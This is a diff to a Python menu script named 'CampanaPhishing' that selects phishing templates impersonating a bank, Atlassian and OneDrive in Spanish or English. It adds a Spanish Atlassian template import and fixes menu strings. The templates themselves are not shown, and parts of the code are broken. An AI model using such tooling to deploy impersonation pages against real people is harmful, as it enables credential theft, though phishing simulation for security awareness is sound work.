@@ -6,6 +6,7 @@ import smtplib
 #Import templates
 from Templates.spanish.bankEs import BankEs
 from Templates.spanish.onedriveEs import OneDriveEs
+from Templates.spanish.atalasianEs import AtalassianEs
 
 #Import helpers
 from helper.helper import getPath,generateFolderReport
@@ -15,16 +16,17 @@ Version="0.1"
 def main():
     print("Starting CampanaPhishing --> Version: v"+Version+"\n Templates to deploy:")
     print("\n[1] Bank ")
-    print("\n[2] Atalasian")
+    print("\n[2] Atalassian")
     print("\n[3] OneDrive")
     print("\nSelect your option: \n")
 
-    #Save path and create directory where the user save the reports
-
+    #
     value=int(input())
     languageString="Choose language: \n[0]Spanish \n[1]English"+getPath()
+
+    #Save path and create directory where the user save the reports
     generateFolderReport()
-    
+
     #Bank Template
     if value == 1:
         print("\nBank:\n"+languageString)
@@ -36,14 +38,14 @@ def main():
             else:
                 #Template English
                 
-    #Atalasian
+    #Atalassian
     elif value ==2:
-        print("\nAtalasian:\n"languageString)
+        print("\nAtalassian:\n"+languageString)
         language=int(input())
         while language!=0|language!=1:
             if language==0:
                 #Template Spanish
-                OneDriveEs()
+                AtalassianEs()
             else:
                 #Template English
                 
